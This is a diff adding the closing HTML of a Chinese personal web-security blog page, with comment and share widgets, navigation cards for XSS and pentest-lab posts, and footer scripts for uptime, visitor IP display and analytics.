+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/share/css/share.min.css">
+
+<div id="article-share">
+    
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+    <div class="livere-card card" data-aos="fade-up">
+    <!-- 来必力City版安装代码 -->
+    <div id="lv-container" class="card-content" data-id="city" data-uid="MTAyMC80OTIwMS8yNTY5NQ==">
+        <script type="text/javascript">
+            (function (d, s) {
+                let j, e = d.getElementsByTagName(s)[0];
+                if (typeof LivereTower === 'function') {
+                    return;
+                }
+
+                j = d.createElement(s);
+                j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+                j.async = true;
+
+                e.parentNode.insertBefore(j, e);
+            })(document, 'script');
+        </script>
+        <noscript>为正常使用来必力评论功能请激活JavaScript。</noscript>
+    </div>
+    <!-- City版安装代码已完成 -->
+</div>
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/posts/b0f.html">
+                    <div class="card-image">
+                        
+                        
+                        <img src="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/medias/featureimages/15.jpg" class="responsive-img" alt="xss利用">
+                        
+                        <span class="card-title">xss利用</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            xss盗取cookie什么是cookiecookie是曲奇饼，啊开个玩笑，cookie是每个用户登录唯一id和账号密码一样可以登录到网站，是的你没有听错cookie可以直接登录，至于服务器怎么设置cookie和cookie存储这里就不说了，
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2020-07-18
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/web%E5%AE%89%E5%85%A8/" class="post-category">
+                                    web安全
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/xss/">
+                        <span class="chip bg-color">xss</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/posts/fb02.html">
+                    <div class="card-image">
+                        
+                        
+                        <img src="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/medias/featureimages/8.jpg" class="responsive-img" alt="Web-for-Pentester靶场-xss部分">
+                        
+                        <span class="card-title">Web-for-Pentester靶场-xss部分</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            配置官网:https://pentesterlab.com/下载地址:https://isos.pentesterlab.com/web_for_pentester_i386.iso安装方法:虚拟机按照，该靶场是封装在debian系统里，安
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-07-15
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/web%E5%AE%89%E5%85%A8/" class="post-category">
+                                    web安全
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/xss/">
+                        <span class="chip bg-color">xss</span>
+                    </a>
+                    
+                    <a href="/tags/%E9%9D%B6%E5%9C%BA/">
+                        <span class="chip bg-color">靶场</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+<script>
+    $('#articleContent').on('copy', function (e) {
+        // IE8 or earlier browser is 'undefined'
+        if (typeof window.getSelection === 'undefined') return;
+
+        var selection = window.getSelection();
+        // if the selection is short let's not annoy our users.
+        if (('' + selection).length < Number.parseInt('120')) {
+            return;
+        }
+
+        // create a div outside of the visible area and fill it with the selected text.
+        var bodyElement = document.getElementsByTagName('body')[0];
+        var newdiv = document.createElement('div');
+        newdiv.style.position = 'absolute';
+        newdiv.style.left = '-99999px';
+        bodyElement.appendChild(newdiv);
+        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
+
+        // we need a <pre> tag workaround.
+        // otherwise the text inside "pre" loses all the line breaks!
+        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
+            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
+        }
+
+        var url = document.location.href;
+        newdiv.innerHTML += '<br />'
+            + '来源: Script kiddie&#39;s life<br />'
+            + '文章作者: Lmg<br />'
+            + '文章链接: <a href="' + url + '">' + url + '</a><br />'
+            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';
+
+        selection.selectAllChildren(newdiv);
+        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
+    });
+</script>
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/codeBlock/codeShrink.js"></script>
+
+
+<!-- 代码块折行 -->
+
+<style type="text/css">
+code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }
+</style>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+    <footer class="page-footer bg-color">
+    
+    <div class="container row center-align" style="margin-bottom: 15px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            <span id="year">2020</span>
+            <a href="https://Lmg66.github.io" target="_blank">Lmg</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            
+            
+            
+            
+             <span id="busuanzi_container_site_pv" style='display:none'></span> <i class="fa fa-heart-o"></i> 本站总访问量 <span id="busuanzi_value_site_pv" class="white-color"></span>   <span id="busuanzi_container_site_uv" style='display:none'></span> 人次,&nbsp;访客数 <span id="busuanzi_value_site_uv" class="white-color"></span> 人. 
+
+            <br>
+            
+            <span id="sitetime">载入运行时间...</span>
+
+            <script>
+                function siteTime() {
+                    var seconds = 1000;
+                    var minutes = seconds * 60;
+                    var hours = minutes * 60;
+                    var days = hours * 24;
+                    var years = days * 365;
+                    var today = new Date();
+                    var startYear = "2020";
+                    var startMonth = "3";
+                    var startDate = "22";
+                    var startHour = "0";
+                    var startMinute = "0";
+                    var startSecond = "0";
+                    var todayYear = today.getFullYear();
+                    var todayMonth = today.getMonth() + 1;
+                    var todayDate = today.getDate();
+                    var todayHour = today.getHours();
+                    var todayMinute = today.getMinutes();
+                    var todaySecond = today.getSeconds();
+                    var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
+                    var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
+                    var diff = t2 - t1;
+                    var diffYears = Math.floor(diff / years);
+                    var diffDays = Math.floor((diff / days) - diffYears * 365);
+                    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
+                    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) /
+                        minutes);
+                    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours -
+                        diffMinutes * minutes) / seconds);
+                    if (startYear == todayYear) {
+                        document.getElementById("year").innerHTML = todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffDays + " 天 " + diffHours +
+                            " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    } else {
+                        document.getElementById("year").innerHTML = startYear + " - " + todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffYears + " 年 " + diffDays +
+                            " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    }
+                }
+
+                setInterval(siteTime, 1000);
+            </script>
+
+            
+            <script src="https://pv.sohu.com/cityjson?ie=utf-8"></script> 
+            <script type="text/javascript">  
+            document.write('欢迎来自:' + returnCitySN["cname"]+'的朋友' + ",您的IP:" + returnCitySN["cip"] + ",浏览器版本:"+getBrowserInfo());
+        function getBrowserInfo()
+{
+    var agent = navigator.userAgent.toLowerCase() ;
+    var regStr_ie = /msie [\d.]+;/gi ;
+    var regStr_ff = /firefox\/[\d.]+/gi
+    var regStr_chrome = /chrome\/[\d.]+/gi ;
+    var regStr_saf = /safari\/[\d.]+/gi ;
+    //IE
+    if(agent.indexOf("msie") > 0)
+    {
+        return agent.match(regStr_ie) ;
+    }
+    //firefox
+    if(agent.indexOf("firefox") > 0)
+    {
+        return agent.match(regStr_ff) ;
+    }
+    //Chrome
+    if(agent.indexOf("chrome") > 0)
+    {
+        return agent.match(regStr_chrome) ;
+    }
+    //Safari
+    if(agent.indexOf("safari") > 0 && agent.indexOf("chrome") < 0)
+    {
+        return agent.match(regStr_saf) ;
+    }
+}
+</script> 
+
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/Lmg66" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:1052324194@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1052324194" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1052324194" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc("https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/" + "search.xml", 'searchInput', 'searchResult');
+});
+</script>
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+<canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+<script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+<script type="text/javascript" src="/js/fireworks.js"></script>
+
+<script src="/js/cursor.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/materialize/materialize.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/aos/aos.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    
+    <script async src="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+    
+    
+    <script src="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/instantpage/instantpage.js" type="module"></script>
+    
+    <script type="text/javascript">
+    var OriginTitile=document.title,st;
+    document.addEventListener("visibilitychange",function(){
+        document.hidden?(document.title="ヽ(●-`Д´-)ノ404啦",clearTimeout(st)):(document.title="(Ő∀Ő3)ノ骗你的嘿嘿！",st=setTimeout(function(){document.title=OriginTitile},3e3))
+    })
+
+</script>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+
+</html>
